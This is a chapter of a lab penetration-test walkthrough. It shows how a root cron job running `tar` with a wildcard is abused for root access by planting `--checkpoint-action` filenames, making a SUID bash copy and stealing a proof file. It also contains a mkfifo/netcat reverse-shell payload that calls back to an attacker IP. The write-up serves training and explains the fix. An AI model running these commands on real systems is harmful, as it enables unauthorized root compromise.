# 06 — Root: a tar wildcard in a cron job

`sudo` is closed, the Usermin install is root-owned, and the kernel is patched. The way up is a cron
job that runs `tar` as root from a directory `cassie` owns. That combination is a root shell with a
two-minute delay.

---

## 6.1 What cassie can do

```bash
id; sudo -l
```

```text
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)

Sorry, user cassie may not run sudo on lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111.
```

No sudo entry at all — not even `(ALL) NOPASSWD: /usr/bin/less`. The group list is ordinary desktop
Ubuntu; `adm` buys log reading, `cdrom`/`dip`/`plugdev` buy nothing remotely. Three obvious leads and
what happened to each:

| Lead | Result |
|---|---|
| `/etc/usermin` | `root:bin 755` — world-readable, not writable. The config is not a privesc |
| `/etc/webmin` | does not exist — this is Usermin only |
| `/var/backups` | apt state only, `root:root`, nothing writable |
| `/opt/admin` | **owned by `cassie:cassie`** and empty |
| `/etc/cron.d/` | world-readable, and there is a custom job in it |

An empty directory owned by a normal user is not interesting by itself. An empty directory owned by a
normal user that a root cron job `cd`s into is the whole box.

## 6.2 The cron job

```bash
stat -c '%A %U:%G %n' /opt/admin; ls -A /opt/admin; cat /etc/cron.d/2minutes
```

```text
drwxr-xr-x cassie:cassie /opt/admin

*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
```

(`ls -A` prints nothing: the directory is empty. That is the point — cassie owns a directory that
root's cron job enters on a schedule.)

Read that command the way the shell will:

1. `cd /opt/admin` — a directory **cassie owns**.
2. `tar -zxf /tmp/backup.tar.gz *` — the `*` is expanded by the shell, as root, **in that
   directory**.

So `cassie` controls the arguments that `tar` receives. That is the vulnerability: no privilege
escalation bug in `tar`, just a program being handed an argv it was never meant to parse.

## 6.3 Why `tar` treats filenames as options

GNU `tar` reads its options and its file list from the same `argv`. `getopt_long` sees an argument
starting with `--` and parses it as a long option, wherever it appears. There is no "these came from
a glob, treat them as files" mode.

Two options are enough:

| Filename created by cassie | How `tar` reads it |
|---|---|
| `--checkpoint=1` | enable checkpointing on every record |
| `--checkpoint-action=exec=sh pwn.sh` | at each checkpoint, run `sh pwn.sh` |

`--checkpoint-action=exec=` runs its argument with `/bin/sh -c`, with the working directory `tar`
inherited — `/opt/admin`. So the payload is just a shell script sitting next to it.

The subtle part that makes this work from a single `touch`: **glob expansion happens after word
splitting and is never re-split.** A file literally named

```text
--checkpoint-action=exec=sh pwn.sh
```

arrives as **one** argv element, spaces and all. `tar` sees one long option whose value is
`exec=sh pwn.sh`. If you tried to type it as a command argument you would need quoting; the glob
does the quoting for you.

## 6.4 Reproducing it before touching the box

Never plant a cron payload you have not seen fire. The exact command shape — same glob, same
directory ownership, same two filenames — in a disposable directory:

```bash
BASE=/tmp/tartest
rm -rf "$BASE"; mkdir -p "$BASE/admin"
cd "$BASE/admin"

cat > pwn.sh <<'EOF'
#!/bin/sh
id > /tmp/tartest/EXECUTED.txt
EOF
chmod +x pwn.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'

ls -b1
```

```text
--checkpoint-action=exec=sh\ pwn.sh
--checkpoint=1
pwn.sh
```

`ls -b` prints the space as `\ `, which is a useful sanity check that the filename really contains
one space and not two.

```bash
cd "$BASE/admin" && tar -zxf "$BASE/backup.tar.gz" *
cat "$BASE/EXECUTED.txt"
```

```text
tar: pwn.sh: Not found in archive
tar: Exiting with failure status due to previous errors

uid=0(root) gid=0(root) groups=0(root)
```

Three observations from that run, each of which matters on the target:

1. **The action fires even though the archive does not exist.** `tar` opens the (missing) archive,
   the gzip child fails, but the option list has already been parsed and the checkpoint action runs
   anyway. On the real box `/tmp/backup.tar.gz` may or may not be there; you do not need to create it.
2. **`tar` exits non-zero and prints an error.** That is normal. A failed cron job that has already
   run your script is still a win.
3. **`id` is `uid=0`.** The exec'd command inherits `tar`'s UID, which in cron is root.

## 6.5 Planting it on the target

SSH in as `cassie` (chapter 05) — or push the same commands through the Usermin RCE if you are still
working without a shell — and run:

```bash
cd /opt/admin

cat > pwn.sh <<'EOF'
#!/bin/sh
cp /bin/bash /home/cassie/rootbash
chmod 4755 /home/cassie/rootbash
cp /root/proof.txt /home/cassie/proof.txt 2>/dev/null
chmod 644 /home/cassie/proof.txt 2>/dev/null
EOF
chmod +x pwn.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
ls -b1
```

```text
--checkpoint-action=exec=sh\ pwn.sh
--checkpoint=1
pwn.sh
```

Or, packaged with a wait loop that tells you when it lands:
[`scripts/privesc_tar_wildcard_7f3a.sh`](scripts/privesc_tar_wildcard_7f3a.sh).

```bash
./privesc_tar_wildcard_7f3a.sh
```

```text
[+] planted in /opt/admin:
--checkpoint-action=exec=sh\ pwn.sh
--checkpoint=1
pwn.sh

[*] waiting for the 2-minute cron tick (Ctrl-C is safe, the job stays armed)
[+] rootbash is SUID after ~120s
```

```bash
ls -l /home/cassie/rootbash /home/cassie/proof.txt
```

```text
-rwsr-xr-x 1 root root ... /home/cassie/rootbash
-rw-r--r-- 1 root root ... /home/cassie/proof.txt
```

The `s` in the owner's execute position means SUID, and the owner is `root`. Both files appearing
together also confirms the script ran to completion, not just its first line.

## 6.6 Using it

```bash
/home/cassie/rootbash -p -i
```

```text
rootbash-5.1# cat proof.txt
06fc3530c91d86d66a81d84a116f4eb0
```

**`-p` is mandatory.** bash drops its effective UID when it starts unless it is invoked with `-p`,
so a bare `/home/cassie/rootbash` gives you a shell that says `uid=1000(cassie)` and cannot read
`/root`. With `-p`, the effective UID stays 0. One-shot form, no interactive shell:

```bash
/home/cassie/rootbash -p -c 'id; cat /root/proof.txt'
```

### If SUID does not work

If `/home` is mounted `nosuid`, the binary will exist with the `s` bit set and still run as cassie
(`findmnt -no OPTIONS /home`). In that case the SUID copy is useless and root has to come from the
cron job itself — add a callback to the payload:

```bash
cat > /opt/admin/pwn.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.158 1377 > /tmp/f
EOF
chmod +x /opt/admin/pwn.sh
```

with `nc -lvnp 1377` already listening. That path depends on egress from the target to your host,
which did not work on this engagement (chapter 04) — which is exactly why the payload copies the
flag out as well as the shell. Whichever of the three outcomes arrives first is enough.

## 6.7 Why this is the intended path

Everything about the box points here:

- `/opt/admin` is empty and owned by `cassie` — the only writable directory that any root process
  touches on a schedule.
- The cron file is world-readable and named `2minutes`, which is as close to a hint as a box author
  gets.
- `tar` is invoked with a bare `*` from that directory. That is not a default in any Ubuntu install;
  it was written by hand.
- The command would be safe with `tar -zxf /tmp/backup.tar.gz -C /opt/admin .` or with
  `--no-unquote`/`./*`. The absence of any of those is the box.

## 6.8 What chapter 06 established

- `cassie` owns `/opt/admin`; a root cron job runs `tar -zxf /tmp/backup.tar.gz *` inside it.
- The `*` lets cassie inject `--checkpoint=1` and `--checkpoint-action=exec=sh pwn.sh` as options.
- Verified in a sandbox reproduction: the action executes as `uid=0`, even without the archive.
- On the target: SUID `rootbash` in `/home/cassie` and `proof.txt` copied out.
- `rootbash -p -i` gives an interactive root shell; `-p` is what preserves the effective UID.
